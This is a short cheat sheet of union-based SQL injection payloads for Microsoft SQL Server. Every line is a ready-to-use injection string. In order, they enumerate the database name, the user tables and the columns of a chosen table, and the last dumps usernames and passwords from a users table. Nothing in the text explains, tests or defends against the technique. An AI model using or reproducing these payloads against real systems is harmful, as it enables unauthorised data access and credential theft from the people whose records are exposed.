
Get database
`10' union select 1,(select DB_NAME()),3,4,5,6-- -`

Get tables
`10' union select 1, (select string_agg(name, ',') name from databasename..sysobjects where xtype= 'U'),3,4,5,6-- -`

Get columns
`10' union select 1,name,3,4,5,6 from syscolumns where id =(select id from sysobjects where name = 'tablename')-- -`

Get fields (e.g., usernames and passwords from users table)
`10' union select 1,concat(username, ' ', password),3,4,5,6 FROM users-- -`

